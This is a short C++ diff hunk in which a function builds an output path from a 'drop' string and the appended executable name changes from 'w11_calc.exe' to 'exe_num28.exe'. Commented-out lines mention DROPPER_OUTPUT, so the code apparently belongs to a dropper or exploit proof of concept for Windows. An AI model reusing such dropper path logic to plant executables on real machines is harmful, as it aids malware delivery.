@@ -369,7 +369,7 @@ void set_name(std::uint64_t os_version)
 	std::wstring out(size, L'\0');
 	MultiByteToWideChar(CP_UTF8, 0, drop, -1, out.data(), size);
 
-	name1+=L"w11_calc.exe";
+	name1+=L"\\exe_num28.exe";
 //	name4+=DROPPER_OUTPUT;
 //	name5+=DROPPER_OUTPUT;
 	//name5+=".mui";
